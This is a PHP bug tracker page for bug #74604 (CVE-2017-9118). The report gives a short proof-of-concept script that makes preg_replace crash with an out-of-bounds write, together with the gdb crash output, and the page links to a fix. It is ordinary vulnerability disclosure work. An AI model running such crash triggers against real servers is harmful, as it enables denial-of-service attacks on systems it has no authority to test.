<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='PCRE related Bug #74604 - RDF' href='rss/bug.php?id=74604'>
        <link rel='alternate' type='application/rss+xml' title='PCRE related Bug #74604 - RSS 2.0' href='rss/bug.php?id=74604&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Bug #74604 :: Out of bounds in php_pcre_replace_impl</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=74604">Bug</a>&nbsp;#74604</th>
            <td id="summary" colspan="5">Out of bounds in php_pcre_replace_impl</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2017-05-17 09:12 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2021-10-20 12:07 UTC</td>
            <td rowspan="6">

                <table id="votes">
                    <tr><th class="details">Votes:</th><td>1</td></tr>
                    <tr><th class="details">Avg. Score:</th><td>5.0 &plusmn; 0.0</td></tr>
                    <tr><th class="details">Reproduced:</th><td>1 of 1 (100.0%)</td></tr>
                    <tr><th class="details">Same Version:</th><td>0 (0.0%)</td></tr>
                    <tr><th class="details">Same OS:</th><td>0 (0.0%)</td></tr>
                </table>

            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=cmb">cmb</a> (<a href="https://people.php.net/cmb">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Verified</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=PCRE+related">PCRE related</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>7.1.5</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9118" target="_blank">2017-9118</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=74604&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=74604&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=74604&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>

<form id="vote" method="post" action="vote.php">
    <div class="sect">
        <fieldset>
            <legend>Have you experienced this issue?</legend>
            <div>
                <input type="radio" id="rep-y" name="reproduced" value="1" onchange="show('canreproduce')"> <label for="rep-y">yes</label>
                <input type="radio" id="rep-n" name="reproduced" value="0" onchange="hide('canreproduce')"> <label for="rep-n">no</label>
                <input type="radio" id="rep-d" name="reproduced" value="2" onchange="hide('canreproduce')" checked="checked"> <label for="rep-d">don't know</label>
            </div>
        </fieldset>
        <fieldset>
            <legend>Rate the importance of this bug to you:</legend>
            <div>
                <label for="score-5">high</label>
                <input type="radio" id="score-5" name="score" value="2">
                <input type="radio" id="score-4" name="score" value="1">
                <input type="radio" id="score-3" name="score" value="0" checked="checked">
                <input type="radio" id="score-2" name="score" value="-1">
                <input type="radio" id="score-1" name="score" value="-2">
                <label for="score-1">low</label>
            </div>
        </fieldset>
    </div>
    <div id="canreproduce" class="sect" style="display: none">
        <fieldset>
            <legend>Are you using the same PHP version?</legend>
            <div>
                <input type="radio" id="ver-y" name="samever" value="1"> <label for="ver-y">yes</label>
                <input type="radio" id="ver-n" name="samever" value="0" checked="checked"> <label for="ver-n">no</label>
            </div>
        </fieldset>
        <fieldset>
            <legend>Are you using the same operating system?</legend>
            <div>
                <input type="radio" id="os-y" name="sameos" value="1"> <label for="os-y">yes</label>
                <input type="radio" id="os-n" name="sameos" value="0" checked="checked"> <label for="os-n">no</label>
            </div>
        </fieldset>
    </div>
    <div id="submit" class="sect">
        <input type="hidden" name="id" value="74604">
        <input type="submit" value="Vote">
    </div>
</form>
<br clear="all">


<div class='comment type_comment' ><a name="1495012335">&nbsp;</a><strong>[2017-05-17 09:12 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
It seems to be an out of bounds bug.

Test script:
---------------
&lt;?php
ini_set('memory_limit',-1);
$str=str_repeat(&quot;A&quot;,0x7ffffffe);
preg_replace(&quot;/A/i&quot;,$str,&quot;AAAAAAAAAAAAAAAAAA&quot;);


Expected result:
----------------
no crash 

Actual result:
--------------
root@hackyzh-virtual-machine:~# gdb -q --args ./php-7.1.5/sapi/cli/php -n poc2.php 
Reading symbols from /root/php-7.1.5/sapi/cli/php...done.
gdb-peda$ r
[Thread debugging using libthread_db enabled]
Using host libthread_db library &quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;.

Program received signal SIGSEGV, Segmentation fault.

[----------------------------------registers-----------------------------------]
EAX: 0x36dfdfb0 ('A' &lt;repeats 200 times&gt;...)
EBX: 0xb7200000 
ECX: 0x0 
EDX: 0x41 ('A')
ESI: 0x41 ('A')
EDI: 0xb6c0000d --&gt; 0x0 
EBP: 0xbfffbf98 --&gt; 0xb7013100 ('A' &lt;repeats 200 times&gt;...)
ESP: 0xbfffbe90 --&gt; 0xb7002060 ('A' &lt;repeats 200 times&gt;...)
EIP: 0x8106c7d (&lt;php_pcre_replace_impl+941&gt;:	mov    BYTE PTR [ebx],dl)
EFLAGS: 0x210293 (CARRY parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8106c75 &lt;php_pcre_replace_impl+933&gt;:	
    jne    0x8106cb8 &lt;php_pcre_replace_impl+1000&gt;
   0x8106c77 &lt;php_pcre_replace_impl+935&gt;:	mov    eax,DWORD PTR [ebp-0x24]
   0x8106c7a &lt;php_pcre_replace_impl+938&gt;:	movzx  edx,BYTE PTR [eax]
=&gt; 0x8106c7d &lt;php_pcre_replace_impl+941&gt;:	mov    BYTE PTR [ebx],dl
   0x8106c7f &lt;php_pcre_replace_impl+943&gt;:	lea    edx,[eax+0x1]
   0x8106c82 &lt;php_pcre_replace_impl+946&gt;:	add    ebx,0x1
   0x8106c85 &lt;php_pcre_replace_impl+949&gt;:	mov    DWORD PTR [ebp-0x24],edx
   0x8106c88 &lt;php_pcre_replace_impl+952&gt;:	movzx  esi,BYTE PTR [eax]
[------------------------------------stack-------------------------------------]
0000| 0xbfffbe90 --&gt; 0xb7002060 ('A' &lt;repeats 200 times&gt;...)
0004| 0xbfffbe94 --&gt; 0xb7068048 ('A' &lt;repeats 200 times&gt;...)
0008| 0xbfffbe98 --&gt; 0x0 
0012| 0xbfffbe9c --&gt; 0x20 (' ')
0016| 0xbfffbea0 --&gt; 0x0 
0020| 0xbfffbea4 --&gt; 0x0 
0024| 0xbfffbea8 --&gt; 0xbfffbeb0 --&gt; 0x0 
0028| 0xbfffbeac --&gt; 0x3 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
php_pcre_replace_impl (pce=0x8bb1b30, subject_str=0xb7068038, 
    subject=0xb7068048 'A' &lt;repeats 200 times&gt;..., subject_len=0x20, 
    replace_val=0xb7013110, is_callable_replace=0x0, limit=0xffffffff, 
    replace_count=0xbfffc08c) at /root/php-7.1.5/ext/pcre/php_pcre.c:1317
1317						*walkbuf++ = *walk++;
gdb-peda$ x/s $ebx
0xb7200000:	 &lt;Address 0xb7200000 out of bounds&gt;

</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=74604'>Add a Patch</a></p><h2>Pull Requests</h2>
<div>
Pull requests:<br>
<ul>
  <li><a href="https://github.com/php/php-src/pull/7597">Fix #74604: Out of bounds in php_pcre_replace_impl</a>
      (php-src/7597)</li>
</ul>
</div>
<p><a href='gh-pull-add.php?bug_id=74604'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_comment' ><a name="1495502790">&nbsp;</a><strong>[2017-05-23 01:26 UTC] whitehat002 &#x61;&#116; hotmail &#x64;&#111;&#x74; com</strong>
<pre class='note'>Has anyone responded to this bug?
</pre>
</div><div class='comment type_log' ><a name="1497939521">&nbsp;</a><strong>[2017-06-20 06:18 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Type: Security</span>
<span class="added">+Type: Bug</span>
</div></div></div><div class='comment type_log' ><a name="1533267338">&nbsp;</a><strong>[2018-08-03 03:35 UTC] <a href="//people.php.net/kaplan">kaplan@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: 2017-9118</span>
</div></div></div><div class='comment type_comment' ><a name="1544268012">&nbsp;</a><strong>[2018-12-08 11:20 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>If it's not a security issue, it shouldn't have a CVE.
</pre>
</div><div class='comment type_patch' ><a name="1634731523">&nbsp;</a><strong>[2021-10-20 12:05 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<pre class='note'>The following pull request has been associated:

Patch Name: Fix #74604: Out of bounds in php_pcre_replace_impl
On GitHub:  <a href="https://github.com/php/php-src/pull/7597" rel="nofollow">https://github.com/php/php-src/pull/7597</a>
Patch:      <a href="https://github.com/php/php-src/pull/7597.patch" rel="nofollow">https://github.com/php/php-src/pull/7597.patch</a>
</pre>
</div><div class='comment type_log' ><a name="1634731667">&nbsp;</a><strong>[2021-10-20 12:07 UTC] <a href="//people.php.net/cmb">cmb@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status:      Open</span>
<span class="added">+Status:      Verified</span>
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: cmb</span>
</div></div></div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
